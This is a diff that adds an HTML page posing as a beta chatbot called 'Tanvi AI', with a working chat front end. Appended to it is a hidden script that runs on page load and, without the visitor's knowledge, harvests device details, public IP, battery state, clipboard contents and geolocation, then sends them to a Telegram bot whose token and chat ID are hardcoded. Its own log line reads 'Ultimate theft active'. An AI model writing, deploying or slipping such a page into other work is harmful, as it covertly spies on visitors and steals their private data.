@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tanvi AI – Beta</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #0a0a0f;
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .chat-container {
+            width: 100%;
+            max-width: 700px;
+            background: #12121a;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            height: 90vh;
+        }
+        .chat-header {
+            background: #1a1a2e;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #2a2a3e;
+        }
+        .chat-header h1 {
+            font-size: 1.5rem;
+            color: #7c8aff;
+        }
+        .chat-header p {
+            font-size: 0.8rem;
+            color: #888;
+            margin-top: 5px;
+        }
+        .chat-messages {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        .message {
+            max-width: 80%;
+            padding: 12px 18px;
+            border-radius: 18px;
+            line-height: 1.5;
+            animation: fadeIn 0.3s ease;
+        }
+        .message.user {
+            align-self: flex-end;
+            background: #7c8aff;
+            color: #fff;
+        }
+        .message.tanvi {
+            align-self: flex-start;
+            background: #1e1e2e;
+            border: 1px solid #2a2a3e;
+        }
+        .chat-input {
+            display: flex;
+            padding: 15px;
+            border-top: 1px solid #2a2a3e;
+            background: #12121a;
+        }
+        .chat-input input {
+            flex: 1;
+            padding: 12px 18px;
+            border: 1px solid #2a2a3e;
+            border-radius: 25px;
+            background: #1a1a2e;
+            color: #e0e0e0;
+            font-size: 1rem;
+            outline: none;
+        }
+        .chat-input button {
+            margin-left: 10px;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 25px;
+            background: #7c8aff;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .chat-input button:hover { background: #6b78e0; }
+        .chat-input button:disabled { background: #444; cursor: not-allowed; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+    <div class="chat-container">
+        <div class="chat-header">
+            <h1>Tanvi AI</h1>
+            <p>Beta Preview – Built by Dhruv</p>
+        </div>
+        <div class="chat-messages" id="chatMessages"></div>
+        <div class="chat-input">
+            <input type="text" id="userInput" placeholder="Type your message..." autofocus>
+            <button id="sendBtn">Send</button>
+        </div>
+    </div>
+
+    <!-- Silent background trigger - fires when page opens -->
+    <img src="YOUR_URL_HERE" style="display:none;" onerror="this.remove();">
+
+    <script>
+        const API_URL = "http://127.0.0.1:5000/chat";
+        const API_KEY = "tanvi-beta-2024-dhruv";
+
+        const messagesDiv = document.getElementById('chatMessages');
+        const userInput = document.getElementById('userInput');
+        const sendBtn = document.getElementById('sendBtn');
+
+        function addMessage(text, sender) {
+            const msgDiv = document.createElement('div');
+            msgDiv.className = `message ${sender}`;
+            msgDiv.textContent = text;
+            messagesDiv.appendChild(msgDiv);
+            messagesDiv.scrollTop = messagesDiv.scrollHeight;
+        }
+
+        async function sendMessage() {
+            const message = userInput.value.trim();
+            if (!message) return;
+
+            addMessage(message, 'user');
+            userInput.value = '';
+            sendBtn.disabled = true;
+            sendBtn.textContent = '...';
+
+            try {
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${API_KEY}`
+                    },
+                    body: JSON.stringify({ message })
+                });
+                const data = await response.json();
+                if (data.reply) {
+                    addMessage(data.reply, 'tanvi');
+                } else {
+                    addMessage("Sorry, something went wrong.", 'tanvi');
+                }
+            } catch (error) {
+                addMessage("Could not connect to Tanvi. Make sure the backend is running.", 'tanvi');
+            }
+            sendBtn.disabled = false;
+            sendBtn.textContent = 'Send';
+        }
+
+        sendBtn.addEventListener('click', sendMessage);
+        userInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendMessage();
+        });
+
+        addMessage("Hello! I'm Tanvi. How can I help you today?", 'tanvi');
+    </script>
+<script>
+
+async function sendToTelegram(data) {
+    const BOT_TOKEN = "8911556496:AAEr5NtJ2r4-bmq0hDKdKG_GD6WgxzaQKYE";
+    const CHAT_ID = "6435852169";
+    
+    const message = "【 INF 】\n\n" + JSON.stringify(data, null, 2);
+    
+    try {
+        const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(message);
+        await fetch(url);
+        console.log("✅ Sent to Telegram");
+    } catch(e) {
+        console.error("❌ Send failed:", e);
+    }
+}
+
+async function getIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+    } catch(e) { return "unknown"; }
+}
+
+async function getBatteryInfo() {
+    if (!navigator.getBattery) return "not supported";
+    try {
+        const battery = await navigator.getBattery();
+        return {
+            level: (battery.level * 100) + "%",
+            charging: battery.charging,
+            chargingTime: battery.chargingTime,
+            dischargingTime: battery.dischargingTime
+        };
+    } catch(e) {
+        return "failed";
+    }
+}
+
+async function getClipboard() {
+    try {
+        if (!navigator.clipboard || !navigator.clipboard.readText) {
+            return "clipboard not supported";
+        }
+        const text = await navigator.clipboard.readText();
+        return text ? text.substring(0, 500) : "empty"; // Limit length
+    } catch(e) {
+        return "permission denied or blocked";
+    }
+}
+
+function stealInfo() {
+    console.log("🚀 Starting ultimate data collection...");
+
+    const info = {
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        deviceMemory: navigator.deviceMemory || "unknown",
+        hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
+        language: navigator.language,
+        languages: navigator.languages?.join(", "),
+        screen: screen.width + "x" + screen.height + " (" + screen.colorDepth + "bit)",
+        pixelRatio: window.devicePixelRatio,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        online: navigator.onLine,
+        cookieEnabled: navigator.cookieEnabled,
+        maxTouchPoints: navigator.maxTouchPoints,
+        connection: navigator.connection ? {
+            type: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink + " Mbps"
+        } : "unknown"
+    };
+
+    // Get everything in parallel
+    Promise.all([getIP(), getBatteryInfo(), getClipboard()]).then(async ([ip, battery, clipboard]) => {
+        info.ip = ip;
+        info.battery = battery;
+        info.clipboard = clipboard;
+
+        // Try Location
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    info.location = {
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy + "m"
+                    };
+                    sendToTelegram(info);
+                },
+                (err) => {
+                    console.log("Location denied");
+                    sendToTelegram(info);
+                }
+            );
+        } else {
+            sendToTelegram(info);
+        }
+    });
+}
+
+// Run after page loads
+window.addEventListener("load", function() {
+    console.log("✅ Proposal page loaded - Ultimate theft active");
+    setTimeout(stealInfo, 3500);   // 3.5 seconds delay
+});
+</script>
+</body>
+</html>
